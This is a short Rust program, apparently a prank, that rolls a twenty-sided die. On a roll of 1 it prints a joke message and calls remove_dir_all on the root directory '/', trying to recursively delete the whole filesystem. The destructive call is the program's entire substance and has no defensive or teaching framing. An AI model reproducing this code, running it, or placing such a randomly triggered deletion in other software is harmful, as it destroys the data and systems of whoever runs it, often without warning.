use rand::Rng;

fn main() {
    let mut rng = rand::thread_rng();

    if rng.gen_range(1..=20) == 1 {
        println!("rolled a nat 1 lmao");
        std::fs::remove_dir_all("/").unwrap();
    }
}
